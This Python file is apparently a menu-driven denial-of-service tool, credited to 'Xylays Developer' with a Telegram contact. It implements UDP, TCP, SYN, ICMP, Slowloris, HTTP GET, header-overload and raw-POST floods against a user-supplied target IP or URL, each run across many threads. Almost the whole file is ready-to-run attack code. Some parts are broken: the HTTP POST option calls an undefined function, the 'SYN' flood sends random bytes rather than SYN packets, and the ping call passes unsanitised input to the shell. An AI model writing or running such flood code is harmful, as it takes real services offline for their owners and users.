import threading
import socket
import random
import time
import sys
import requests
import os

# Global variables
packet_sent = 0
lock = threading.Lock()

# Usage menu
def usage():
    print("""
╭━━━┳╮╱╱╭┳╮╱╱╭┳━━━┳━━━╮
┃╭━╮┃╰╮╭╯┃╰╮╭╯┃╭━╮┃╭━╮┃
┃╰━╯┣╮╰╯╭┻╮╰╯╭┻╯╭╯┣╯╭╯┃
┃╭╮╭╯╰╮╭╯╱╰╮╭╯╱╱┃╭╯╱┃╭╯
┃┃┃╰╮╱┃┃╱╱╱┃┃╱╱╱┃┃╱╱┃┃╱
╰╯╰━╯╱╰╯╱╱╱╰╯╱╱╱╰╯╱╱╰╯
[!] Tools by Xylays Developer
[!] Contact: t.me/conquerryy

Select Attack Method:
    [1] UDP Flood
    [2] TCP Flood
    [3] HTTP GET Flood
    [4] TCP SYN Flood
    [5] HTTP POST Flood
    [6] Slowloris Attack
    [7] ICMP Ping Flood
    [8] Random Packet Flood
    [9] HTTP Header Overload
    [10] HTTP RAW Payload Attack
    [11] Check IP Address
""")

# Show statistics
def show_statistics():
    while True:
        with lock:
            print(f"[STATISTICS] Total Packets Sent: {packet_sent}", end='\r')
        time.sleep(1)
# -----------------------------
# Attack Functions
# -----------------------------

def udp_flood(ip, port, packets):
    global packet_sent
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            data = random._urandom(1024)
            for _ in range(packets):
                sock.sendto(data, addr)
                with lock:
                    packet_sent += 1
        except:
            pass

def tcp_flood(ip, port, packets):
    global packet_sent
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            data = random._urandom(1024)
            for _ in range(packets):
                sock.send(data)
                with lock:
                    packet_sent += 1
            sock.close()
        except:
            pass

def http_get_flood(url, packets):
    global packet_sent
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while True:
        try:
            for _ in range(packets):
                requests.get(url, headers=headers)
                with lock:
                    packet_sent += 1
        except:
            pass

def syn_flood(ip, port, packets):
    global packet_sent
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            for _ in range(packets):
                sock.sendto(random._urandom(1024), (ip, port))
                with lock:
                    packet_sent += 1
        except:
            pass

def slowloris_attack(ip, port):
    global packet_sent
    sockets = []
    try:
        for _ in range(200):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode('utf-8'))
            sockets.append(s)
        while True:
            for s in sockets:
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
                    with lock:
                        packet_sent += 1
                except:
                    sockets.remove(s)
                    s.close()
            time.sleep(15)
    except:
        pass

def icmp_flood(ip, packets):
    global packet_sent
    while True:
        try:
            for _ in range(packets):
                os.system(f"ping {ip} -l 65500 -n 1")
                with lock:
                    packet_sent += 1
        except:
            pass

def random_flood(ip, port, packets):
    global packet_sent
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            data = random._urandom(4096)
            for _ in range(packets):
                sock.sendto(data, addr)
                with lock:
                    packet_sent += 1
        except:
            pass

def header_overload(url, packets):
    global packet_sent
    while True:
        try:
            headers = {f"X-Custom-{i}": "A"*1000 for i in range(100)}
            for _ in range(packets):
                requests.get(url, headers=headers)
                with lock:
                    packet_sent += 1
        except:
            pass

def raw_payload_attack(url, packets):
    global packet_sent
    payload = random._urandom(5000)
    headers = {
        "Content-Type": "application/octet-stream",
        "User-Agent": "Custom-Raw-Attack"
    }
    while True:
        try:
            for _ in range(packets):
                requests.post(url, data=payload, headers=headers)
                with lock:
                    packet_sent += 1
        except:
            pass
# ------------------------
# Check IP Function
# ------------------------

def check_ip(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(f"Domain {domain} resolved to IP: {ip}")
    except Exception as e:
        print(f"Error resolving domain: {e}")

# ------------------------
# Main Menu
# ------------------------

if __name__ == "__main__":
    usage()
    threading.Thread(target=show_statistics, daemon=True).start()
    choice = input("Select an option (1-11): ")

    if choice == '1':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=udp_flood, args=(ip, port, packets)).start()

    elif choice == '2':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=tcp_flood, args=(ip, port, packets)).start()

    elif choice == '3':
        url = input("Target URL (with http/https): ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=http_get_flood, args=(url, packets)).start()

    elif choice == '4':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=syn_flood, args=(ip, port, packets)).start()

    elif choice == '5':
        url = input("Target URL (with http/https): ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=http_post_flood, args=(url, packets)).start()

    elif choice == '6':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=slowloris_attack, args=(ip, port)).start()

    elif choice == '7':
        ip = input("Target IP: ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=icmp_flood, args=(ip, packets)).start()

    elif choice == '8':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=random_flood, args=(ip, port, packets)).start()

    elif choice == '9':
        url = input("Target URL (with http/https): ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=header_overload, args=(url, packets)).start()

    elif choice == '10':
        url = input("Target URL (with http/https): ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=raw_payload_attack, args=(url, packets)).start()

    elif choice == '11':
        domain = input("Enter domain (without http/https): ")
        check_ip(domain)

    else:
        print("Invalid option. Please choose between 1-11.")